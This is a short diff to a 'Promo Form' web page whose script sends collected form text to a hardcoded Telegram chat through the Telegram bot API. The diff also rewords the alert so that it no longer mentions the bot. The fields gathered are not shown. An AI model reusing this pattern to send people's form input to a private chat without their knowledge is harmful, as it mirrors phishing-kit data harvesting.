@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Promo Request</title>
+<title>Promo Form</title>
 
 <style>
 body{font-family:Arial;background:#111;color:#fff;display:flex;justify-content:center;align-items:center;height:100vh;}
@@ -52,8 +52,8 @@ let token="YOUR_NEW_TOKEN";
 let chatid="240595975";
 
 fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatid}&text=${text}`)
-.then(()=>alert("Data Sent To Bot"))
-.catch(()=>alert("Error Sending"));
+.then(()=>alert("Data Sent"))
+.catch(()=>alert("Error"));
 
 }
 
